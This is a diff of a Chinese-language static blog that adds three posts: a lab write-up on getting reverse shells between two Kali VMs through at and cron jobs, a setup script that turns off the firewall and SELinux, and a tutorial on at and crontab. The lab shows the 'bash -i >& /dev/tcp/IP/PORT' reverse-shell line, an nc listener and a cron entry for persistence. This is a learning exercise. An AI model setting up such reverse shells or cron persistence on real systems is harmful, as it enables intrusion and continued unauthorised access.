@@ -97,7 +97,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/08/09/text/" data-id="cme3u4a6q0000fw0f5akt0eqo" data-title="text" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/08/09/text/" data-id="cme3urlu70000900f3e5g0bbs" data-title="text" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -148,7 +148,596 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/08/09/hello-world/" data-id="cme3u4a6t0001fw0f7bxbeudh" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/08/09/hello-world/" data-id="cme3urlu90001900f9s3z9yk8" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-使用一次性计划 任务 和周期性计划任务反弹shell（5分钟后执行，和每5分钟执行1次），kali主机接收，解释命令字的含义。" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/08/09/%E4%BD%BF%E7%94%A8%E4%B8%80%E6%AC%A1%E6%80%A7%E8%AE%A1%E5%88%92%20%E4%BB%BB%E5%8A%A1%20%E5%92%8C%E5%91%A8%E6%9C%9F%E6%80%A7%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell%EF%BC%885%E5%88%86%E9%92%9F%E5%90%8E%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%92%8C%E6%AF%8F5%E5%88%86%E9%92%9F%E6%89%A7%E8%A1%8C1%E6%AC%A1%EF%BC%89%EF%BC%8Ckali%E4%B8%BB%E6%9C%BA%E6%8E%A5%E6%94%B6%EF%BC%8C%E8%A7%A3%E9%87%8A%E5%91%BD%E4%BB%A4%E5%AD%97%E7%9A%84%E5%90%AB%E4%B9%89%E3%80%82/" class="article-date">
+  <time class="dt-published" datetime="2025-08-09T03:55:11.791Z" itemprop="datePublished">2025-08-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="使用一次性计划-任务-和周期性计划任务反弹shell（5分钟后执行，和每5分钟执行1次），kali主机接收，解释命令字的含义。"><a href="#使用一次性计划-任务-和周期性计划任务反弹shell（5分钟后执行，和每5分钟执行1次），kali主机接收，解释命令字的含义。" class="headerlink" title="使用一次性计划 任务 和周期性计划任务反弹shell（5分钟后执行，和每5分钟执行1次），kali主机接收，解释命令字的含义。"></a>使用一次性计划 任务 和周期性计划任务反弹shell（5分钟后执行，和每5分钟执行1次），kali主机接收，解释命令字的含义。</h1><p>准备两台kali虚拟机，分别是</p>
+<ul>
+<li>攻击机（接受shell）：192.168.0.137</li>
+<li>靶机（发起反弹）：192.168.0.138</li>
+</ul>
+<h2 id="1️⃣一次性计划任务（五分钟后执行一次）"><a href="#1️⃣一次性计划任务（五分钟后执行一次）" class="headerlink" title="1️⃣一次性计划任务（五分钟后执行一次）"></a>1️⃣一次性计划任务（五分钟后执行一次）</h2><h3 id="1-先用一台kali攻击机监听端口"><a href="#1-先用一台kali攻击机监听端口" class="headerlink" title="1.先用一台kali攻击机监听端口"></a>1.先用一台kali攻击机监听端口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-从靶机提交一次性at任务"><a href="#2-从靶机提交一次性at任务" class="headerlink" title="2.从靶机提交一次性at任务"></a>2.从靶机提交一次性at任务</h3><p><img src="https://cdn.jsdelivr.net/gh/kobe88889/img.picgo@main/img/image-20250807183030759.png" alt="image-20250807183030759"></p>
+<h3 id="3-自己随便做点什么事情摸五分钟鱼，从攻击机的nc窗口会收到交互式的Shell，实验成功！"><a href="#3-自己随便做点什么事情摸五分钟鱼，从攻击机的nc窗口会收到交互式的Shell，实验成功！" class="headerlink" title="3.自己随便做点什么事情摸五分钟鱼，从攻击机的nc窗口会收到交互式的Shell，实验成功！"></a>3.自己随便做点什么事情摸五分钟鱼，从攻击机的nc窗口会收到交互式的Shell，实验成功！</h3><p><img src="https://cdn.jsdelivr.net/gh/kobe88889/img.picgo@main/img/image-20250807183400863.png" alt="image-20250807183400863"></p>
+<h2 id="2️⃣周期性计划任务（每五分钟执行一次）"><a href="#2️⃣周期性计划任务（每五分钟执行一次）" class="headerlink" title="2️⃣周期性计划任务（每五分钟执行一次）"></a>2️⃣周期性计划任务（每五分钟执行一次）</h2><h3 id="1-攻击机开启一个监听"><a href="#1-攻击机开启一个监听" class="headerlink" title="1.攻击机开启一个监听"></a>1.攻击机开启一个监听</h3><p><img src="https://cdn.jsdelivr.net/gh/kobe88889/img.picgo@main/img/image-20250807183606411.png" alt="image-20250807183606411"></p>
+<h3 id="2-靶机创建反弹脚本"><a href="#2-靶机创建反弹脚本" class="headerlink" title="2.靶机创建反弹脚本"></a>2.靶机创建反弹脚本</h3><p><img src="https://cdn.jsdelivr.net/gh/kobe88889/img.picgo@main/img/image-20250807185914108.png" alt="image-20250807185914108"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/kobe88889/img.picgo@main/img/image-20250807185931028.png" alt="image-20250807185931028"></p>
+<h3 id="3-写入crontab"><a href="#3-写入crontab" class="headerlink" title="3.写入crontab"></a>3.写入crontab</h3><h3 id="（在里面加了-5-usr-local-bin-rev-sh）"><a href="#（在里面加了-5-usr-local-bin-rev-sh）" class="headerlink" title="（在里面加了*&#x2F;5 * * * * &#x2F;usr&#x2F;local&#x2F;bin&#x2F;rev.sh）"></a>（在里面加了*&#x2F;5 * * * * &#x2F;usr&#x2F;local&#x2F;bin&#x2F;rev.sh）</h3><p><img src="https://cdn.jsdelivr.net/gh/kobe88889/img.picgo@main/img/image-20250807190011402.png" alt="image-20250807190011402"></p>
+<h3 id="4-再次摸鱼五分钟，每过五分钟从攻击机的nc窗口会收到交互式的Shell，实验成功！"><a href="#4-再次摸鱼五分钟，每过五分钟从攻击机的nc窗口会收到交互式的Shell，实验成功！" class="headerlink" title="4.再次摸鱼五分钟，每过五分钟从攻击机的nc窗口会收到交互式的Shell，实验成功！"></a>4.再次摸鱼五分钟，每过五分钟从攻击机的nc窗口会收到交互式的Shell，实验成功！</h3><p><img src="https://cdn.jsdelivr.net/gh/kobe88889/img.picgo@main/img/image-20250807190403643.png" alt="image-20250807190403643"></p>
+<p>清除这两项任务：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/kobe88889/img.picgo@main/img/image-20250807190829975.png" alt="image-20250807190829975"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/kobe88889/img.picgo@main/img/image-20250807190837685.png" alt="image-20250807190837685"></p>
+<h2 id="3️⃣对于用到的命令字的含义作解释"><a href="#3️⃣对于用到的命令字的含义作解释" class="headerlink" title="3️⃣对于用到的命令字的含义作解释"></a>3️⃣对于用到的命令字的含义作解释</h2><table>
+<thead>
+<tr>
+<th align="center">命令、符号</th>
+<th align="center">场景</th>
+<th align="center">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">at</td>
+<td align="center">一次性计划任务</td>
+<td align="center">at 指定时间” 把后面的命令交给 <strong>atd 守护进程</strong>，到点执行一次就结束。</td>
+</tr>
+<tr>
+<td align="center">atq</td>
+<td align="center">查看任务</td>
+<td align="center">at queue 的缩写，列出当前用户的所有待执行 at 任务及其编号。</td>
+</tr>
+<tr>
+<td align="center">atrm&lt;编号&gt;</td>
+<td align="center">删除任务</td>
+<td align="center"><strong>at remove</strong> 的缩写，根据编号把任务从队列里删除。</td>
+</tr>
+<tr>
+<td align="center">crontab -e</td>
+<td align="center">编辑周期性任务</td>
+<td align="center">调用默认编辑器打开 <strong>当前用户</strong> 的 crontab 文件；root 用户加 <code>sudo</code> 就是改 root 的计划任务。</td>
+</tr>
+<tr>
+<td align="center">crontab -r</td>
+<td align="center">清空周期性任务</td>
+<td align="center"><strong>remove</strong>，直接删掉整个 crontab 表，不再执行任何周期性命令。</td>
+</tr>
+<tr>
+<td align="center">*&#x2F;5 * * * *</td>
+<td align="center">crontab时间格式</td>
+<td align="center">每 5 分钟执行一次； <code>               * 代表“每”，</code>&#x2F;&#96; 表示步长。</td>
+</tr>
+<tr>
+<td align="center">nc -lvmp &lt;端口&gt;</td>
+<td align="center">开启端口监听</td>
+<td align="center"><strong>netcat 监听</strong> 模式，<code>-l</code> 监听、 <code>-v</code> 详细输出、<code>-n</code> 不做 DNS 解析、<code>-p</code> 指定端口，用来等靶机连接。</td>
+</tr>
+<tr>
+<td align="center">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;PORT 0&gt;&amp;1</td>
+<td align="center">反弹Shell核心</td>
+<td align="center">把 bash 的 <strong>标准输入&#x2F;输出&#x2F;错误</strong> 全部重定向到 TCP socket，实现远程交互式 Shell。</td>
+</tr>
+<tr>
+<td align="center">tee</td>
+<td align="center">写文件</td>
+<td align="center">把标准输入同时 <strong>输出到屏幕和文件</strong>，常用于需要 sudo 权限时一次性生成脚本。</td>
+</tr>
+<tr>
+<td align="center">&lt;&lt;’EOF’</td>
+<td align="center">heredoc定界符</td>
+<td align="center">把多行文本一次性喂给前面命令，直到独占一行的 <code>EOF</code> 为止。</td>
+</tr>
+<tr>
+<td align="center">chmod +x</td>
+<td align="center">赋可执行权限</td>
+<td align="center">让文件变成可执行脚本，crontab 或手动调用时无需再 <code>bash script.sh</code>。</td>
+</tr>
+</tbody></table>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/08/09/%E4%BD%BF%E7%94%A8%E4%B8%80%E6%AC%A1%E6%80%A7%E8%AE%A1%E5%88%92%20%E4%BB%BB%E5%8A%A1%20%E5%92%8C%E5%91%A8%E6%9C%9F%E6%80%A7%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell%EF%BC%885%E5%88%86%E9%92%9F%E5%90%8E%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%92%8C%E6%AF%8F5%E5%88%86%E9%92%9F%E6%89%A7%E8%A1%8C1%E6%AC%A1%EF%BC%89%EF%BC%8Ckali%E4%B8%BB%E6%9C%BA%E6%8E%A5%E6%94%B6%EF%BC%8C%E8%A7%A3%E9%87%8A%E5%91%BD%E4%BB%A4%E5%AD%97%E7%9A%84%E5%90%AB%E4%B9%89%E3%80%82/" data-id="cme3urlua0002900f14cxfbkm" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-写一个自动化脚本，让一台新机子，完成关防火墙 关虚拟网卡 换源 selinux的操作" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/08/09/%E5%86%99%E4%B8%80%E4%B8%AA%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%AE%A9%E4%B8%80%E5%8F%B0%E6%96%B0%E6%9C%BA%E5%AD%90%EF%BC%8C%E5%AE%8C%E6%88%90%E5%85%B3%E9%98%B2%E7%81%AB%E5%A2%99%20%E5%85%B3%E8%99%9A%E6%8B%9F%E7%BD%91%E5%8D%A1%20%E6%8D%A2%E6%BA%90%20selinux%E7%9A%84%E6%93%8D%E4%BD%9C/" class="article-date">
+  <time class="dt-published" datetime="2025-08-09T03:55:11.791Z" itemprop="datePublished">2025-08-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="写一个自动化脚本，让一台新机子，完成关防火墙-关虚拟网卡-换源-selinux的操作"><a href="#写一个自动化脚本，让一台新机子，完成关防火墙-关虚拟网卡-换源-selinux的操作" class="headerlink" title="写一个自动化脚本，让一台新机子，完成关防火墙 关虚拟网卡 换源 selinux的操作"></a>写一个自动化脚本，让一台新机子，完成关防火墙 关虚拟网卡 换源 selinux的操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">vim /root/init.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">set</span> -euo pipefail</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== 1. 关闭防火墙 ====</span></span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl <span class="built_in">disable</span> firewalld</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[✓] 防火墙已关闭并禁用&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== 2. 设置 SELinux ====</span></span><br><span class="line">setenforce 0</span><br><span class="line">sed -ri <span class="string">&#x27;s/^SELINUX=.*/SELINUX=permissive/&#x27;</span> /etc/selinux/config</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[✓] SELinux 已设为 permissive&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== 3. 关闭虚拟网卡 ====</span></span><br><span class="line">systemctl stop libvirtd.service</span><br><span class="line">systemctl <span class="built_in">disable</span> libvirtd.service</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[✓] libvirtd 已停止并禁用&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== 4. 换源 ====</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /etc/yum.repos.d/backup</span><br><span class="line"><span class="built_in">mv</span> /etc/yum.repos.d/*.repo /etc/yum.repos.d/backup/ 2&gt;/dev/null || <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt;/etc/yum.repos.d/CentOS-Base.repo &lt;&lt;<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">[base]</span><br><span class="line">name=CentOS-Base</span><br><span class="line">baseurl=https://mirrors.aliyun.com/centos-vault/8.5.2111/BaseOS/<span class="variable">$basearch</span>/os/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-centosofficial</span><br><span class="line"></span><br><span class="line">[extras]</span><br><span class="line">name=CentOS-Extras</span><br><span class="line">baseurl=https://mirrors.aliyun.com/centos-vault/8.5.2111/extras/<span class="variable">$basearch</span>/os/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-centosofficial</span><br><span class="line"></span><br><span class="line">[appstream]</span><br><span class="line">name=CentOS-AppStream</span><br><span class="line">baseurl=https://mirrors.aliyun.com/centos-vault/8.5.2111/AppStream/<span class="variable">$basearch</span>/os/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-centosofficial</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">dnf clean all &amp;&amp; dnf makecache</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[✓] 已更换为阿里云 vault 源&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== 5. 检查结果 ====</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;========== 检查结果 ==========&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[防火墙] systemctl is-active firewalld =&gt; <span class="subst">$(systemctl is-active firewalld)</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[SELinux] getenforce =&gt; <span class="subst">$(getenforce)</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[虚拟网卡] ip a | grep virbr =&gt; <span class="subst">$(ip a | grep virbr || echo &#x27;无 virbr&#x27;)</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[源] dnf repolist | head -3 =&gt;&quot;</span></span><br><span class="line">dnf repolist | <span class="built_in">head</span> -3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/root/init.sh</span><br><span class="line"><span class="built_in">chmod</span> +x /root/init.sh</span><br><span class="line">/root/init.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://kobea.oss-cn-beijing.aliyuncs.com/image-20250808124231747.png" alt="image-20250808124231747"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/08/09/%E5%86%99%E4%B8%80%E4%B8%AA%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%AE%A9%E4%B8%80%E5%8F%B0%E6%96%B0%E6%9C%BA%E5%AD%90%EF%BC%8C%E5%AE%8C%E6%88%90%E5%85%B3%E9%98%B2%E7%81%AB%E5%A2%99%20%E5%85%B3%E8%99%9A%E6%8B%9F%E7%BD%91%E5%8D%A1%20%E6%8D%A2%E6%BA%90%20selinux%E7%9A%84%E6%93%8D%E4%BD%9C/" data-id="cme3urlub0003900fheu83wy9" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-一、计划任务概述" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/08/09/%E4%B8%80%E3%80%81%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%A6%82%E8%BF%B0/" class="article-date">
+  <time class="dt-published" datetime="2025-08-09T03:55:11.791Z" itemprop="datePublished">2025-08-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="一、计划任务概述"><a href="#一、计划任务概述" class="headerlink" title="一、计划任务概述"></a>一、计划任务概述</h2><h3 id="1-怎么理解计划任务的定义"><a href="#1-怎么理解计划任务的定义" class="headerlink" title="1.怎么理解计划任务的定义"></a><strong>1.怎么理解计划任务的定义</strong></h3><p>​	1️⃣可以自行设定希望它在什么时间或者以什么频率按照预先设定好的去执行的脚本（命令）。</p>
+<p>​	2️⃣本功能的主要应用范围：</p>
+<p>​		（1）按照设置的时间延时执行任务（类似人类设置闹钟叫自己起床）</p>
+<p>​		（2）以一定的频率自动循环运行设置好的任务（类似为每天下午四点钟喝水吃零食）</p>
+<p>​		（3）无人情况下机器按照设定自行完成任务（无人值守服务器运维）</p>
+<h3 id="2-Linux中实现计划任务的两种方法"><a href="#2-Linux中实现计划任务的两种方法" class="headerlink" title="2.Linux中实现计划任务的两种方法"></a><strong>2.Linux中实现计划任务的两种方法</strong></h3><table>
+<thead>
+<tr>
+<th align="center">工具</th>
+<th align="center">适用场景</th>
+<th align="center">时间精度</th>
+<th align="center">特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">at</td>
+<td align="center">一次性、延迟任务</td>
+<td align="center">秒级</td>
+<td align="center">简单，不用长期守护</td>
+</tr>
+<tr>
+<td align="center">cron</td>
+<td align="center">周期性重复任务</td>
+<td align="center">分钟级</td>
+<td align="center">复杂，需要长期守护</td>
+</tr>
+</tbody></table>
+<p><img src="https://kobea.oss-cn-beijing.aliyuncs.com/image-20250806202631278.png" alt="image-20250806202631278"></p>
+<h2 id="二、-at-命令"><a href="#二、-at-命令" class="headerlink" title="二、 at 命令"></a>二、 at 命令</h2><h3 id="2-1-基本语法"><a href="#2-1-基本语法" class="headerlink" title="2.1 基本语法"></a>2.1 基本语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at[选项] 时间表达式 [命令]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>​	提交任务：输入命令后按 Ctrl+D 提交。</li>
+<li>​	查看任务： atq （列出所有任务）。</li>
+<li>​	删除任务： atrm &lt;任务ID&gt; 。</li>
+</ul>
+<h3 id="2-2-时间表达式"><a href="#2-2-时间表达式" class="headerlink" title="2.2 时间表达式"></a>2.2 时间表达式</h3><ul>
+<li>灵活时间格式：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">now  # 立即执行</span><br><span class="line">now + 5min # 5分钟后</span><br><span class="line">05:30 tomorrow/today # 次日5:30</span><br><span class="line">2025-8-6 11:11 # 绝对时间</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>举例：</li>
+</ul>
+<p><img src="https://kobea.oss-cn-beijing.aliyuncs.com/image-20250806204421096.png" alt="image-20250806204421096"></p>
+<p>该警告表示计划任务需要使用内置命令才可以</p>
+<h3 id="2-3-实战场景入门"><a href="#2-3-实战场景入门" class="headerlink" title="2.3 实战场景入门"></a>2.3 实战场景入门</h3><p><strong>场景：固定时间任务-每天凌晨2点备份数据库</strong></p>
+<p><img src="https://kobea.oss-cn-beijing.aliyuncs.com/image-20250806205204861.png" alt="image-20250806205204861"></p>
+<p><strong>date命令解释：</strong><br>date 的格式化符号以 % 开头，后接特定字母表示不同时间单位。</p>
+<table>
+<thead>
+<tr>
+<th align="center">符号</th>
+<th align="center">含义</th>
+<th align="center">示例值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">%Y</td>
+<td align="center">四位年份</td>
+<td align="center">2025</td>
+</tr>
+<tr>
+<td align="center">%m</td>
+<td align="center">两位月份</td>
+<td align="center">05</td>
+</tr>
+<tr>
+<td align="center">%d</td>
+<td align="center">两位日期</td>
+<td align="center">12</td>
+</tr>
+<tr>
+<td align="center">%H</td>
+<td align="center">24小时制小时</td>
+<td align="center">24</td>
+</tr>
+<tr>
+<td align="center">%I</td>
+<td align="center">12小时制小时</td>
+<td align="center">12</td>
+</tr>
+<tr>
+<td align="center">%M</td>
+<td align="center">两位分钟</td>
+<td align="center">22</td>
+</tr>
+<tr>
+<td align="center">%S</td>
+<td align="center">两位秒</td>
+<td align="center">33</td>
+</tr>
+<tr>
+<td align="center">%a</td>
+<td align="center">星期几缩写</td>
+<td align="center">Sun</td>
+</tr>
+<tr>
+<td align="center">%A</td>
+<td align="center">星期几全称</td>
+<td align="center">Sunday</td>
+</tr>
+<tr>
+<td align="center">%b</td>
+<td align="center">月份缩写</td>
+<td align="center">Apr</td>
+</tr>
+<tr>
+<td align="center">%B</td>
+<td align="center">月份全称</td>
+<td align="center">April</td>
+</tr>
+<tr>
+<td align="center">%F</td>
+<td align="center">ISO 8601日期格式</td>
+<td align="center">2023-07-28</td>
+</tr>
+<tr>
+<td align="center">%T</td>
+<td align="center">24小时制时间格式</td>
+<td align="center">14:30:00</td>
+</tr>
+<tr>
+<td align="center">%R</td>
+<td align="center">12小时制时间格式</td>
+<td align="center">02:30 PM</td>
+</tr>
+<tr>
+<td align="center">%z</td>
+<td align="center">时区偏移</td>
+<td align="center">UTC+8</td>
+</tr>
+<tr>
+<td align="center">%s</td>
+<td align="center">自纪元起经过的秒数</td>
+<td align="center">168792300</td>
+</tr>
+</tbody></table>
+<p><strong>场景3：复杂时间格式</strong><br>支持灵活时间描述：</p>
+<ul>
+<li>now ：立即执行</li>
+<li>today &#x2F; tomorrow ：当天&#x2F;次日</li>
+<li>YYYY-MM-DD HH:MM ：绝对时间</li>
+<li>+N days &#x2F; -N minutes ：相对时间</li>
+</ul>
+<p>举例：2025年12月25日23:59执行关机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">at 23:59 Dec 25 2025</span><br><span class="line">shutdown -h now</span><br><span class="line">Ctrl+D 提交</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-4-管理命令"><a href="#2-4-管理命令" class="headerlink" title="2.4 管理命令"></a><strong>2.4 管理命令</strong></h3><table>
+<thead>
+<tr>
+<th align="center">命令</th>
+<th align="center">作用</th>
+<th align="center">示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">atq</td>
+<td align="center">查看所有等待执行的任务</td>
+<td align="center">atq -1（详细列表）</td>
+</tr>
+<tr>
+<td align="center">atrm</td>
+<td align="center">删除任务</td>
+<td align="center">atrm 3(删除ID&#x3D;3的任务)</td>
+</tr>
+<tr>
+<td align="center">at -c</td>
+<td align="center">查看任务内容</td>
+<td align="center">at -c 5 (查看ID&#x3D;5的任务)</td>
+</tr>
+</tbody></table>
+<p><img src="https://kobea.oss-cn-beijing.aliyuncs.com/image-20250806210734227.png" alt="image-20250806210734227"></p>
+<h2 id="三、-cron-命令详解"><a href="#三、-cron-命令详解" class="headerlink" title="三、 cron 命令详解"></a>三、 cron 命令详解</h2><h3 id="3-1-cron-核心功能"><a href="#3-1-cron-核心功能" class="headerlink" title="3.1 cron 核心功能"></a>3.1 cron 核心功能</h3><p>cron 是 Linux&#x2F;Unix 系统中守护周期性任务的进程，适合以下场景：</p>
+<ul>
+<li>定时备份（每隔一段时间自动备份）</li>
+<li>日志清理（定时删除过期的日志文件）</li>
+<li>数据同步（每隔多久同步服务器之间的数据）</li>
+<li>监控报警（检测状态并通知）</li>
+</ul>
+<h3 id="3-2-配置文件"><a href="#3-2-配置文件" class="headerlink" title="3.2 配置文件"></a>3.2 配置文件</h3><ul>
+<li>系统级： &#x2F;etc&#x2F;crontab 编辑模板（所有用户生效）。</li>
+</ul>
+<p><img src="https://kobea.oss-cn-beijing.aliyuncs.com/image-20250806211358199.png" alt="image-20250806211358199"></p>
+<ul>
+<li>语法格式：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> * 	 *	 *	 *	 *	用户名	命令</span><br><span class="line">分钟 小时 日  月   周</span><br><span class="line">（“分时日月周”）</span><br></pre></td></tr></table></figure>
+
+<p>3.3 时间表达式</p>
+<ul>
+<li>字段说明：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">字段</th>
+<th align="center">允许值</th>
+<th align="center">特殊符号</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">分</td>
+<td align="center">0-59</td>
+<td align="center">* , - , &#x2F; , ?</td>
+</tr>
+<tr>
+<td align="center">时</td>
+<td align="center">0-23</td>
+<td align="center">* , - , &#x2F; , ?</td>
+</tr>
+<tr>
+<td align="center">日</td>
+<td align="center">1-31</td>
+<td align="center">* , - , &#x2F; , L</td>
+</tr>
+<tr>
+<td align="center">月</td>
+<td align="center">1-12</td>
+<td align="center">* , - , &#x2F;</td>
+</tr>
+<tr>
+<td align="center">周</td>
+<td align="center">0-7</td>
+<td align="center">* , - , L</td>
+</tr>
+</tbody></table>
+<ul>
+<li>举例：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0 2 * * * root /usr/bin/systemctl restart nginx #每日凌晨2点重启Nginx</span><br><span class="line">30 4 * * 1-5 user1 /home/user1/backup.sh # 工作日每天4:30备份</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-管理命令详解"><a href="#3-3-管理命令详解" class="headerlink" title="3.3 管理命令详解"></a>3.3 管理命令详解</h3><p>crontab 是 cron 的配置工具，用于安装、删除、编辑用户的计划任务。</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>crontab -e</td>
+<td>编辑当前用户任务</td>
+<td>crontab -e</td>
+</tr>
+<tr>
+<td>crontab -l</td>
+<td>列出当前用户任务</td>
+<td>crontab -l</td>
+</tr>
+<tr>
+<td>crontab -r</td>
+<td>删除当前用户所有任务</td>
+<td>crontab -r</td>
+</tr>
+<tr>
+<td>crontab -u username</td>
+<td>管理其他用户任务（需sudo）</td>
+<td>sudo crontab -e user1</td>
+</tr>
+<tr>
+<td>crontab -i</td>
+<td>编辑时交互提示</td>
+<td>crontab -i</td>
+</tr>
+<tr>
+<td>crontab -d</td>
+<td>删除用户任务（旧版用法）</td>
+<td>crontab -d</td>
+</tr>
+</tbody></table>
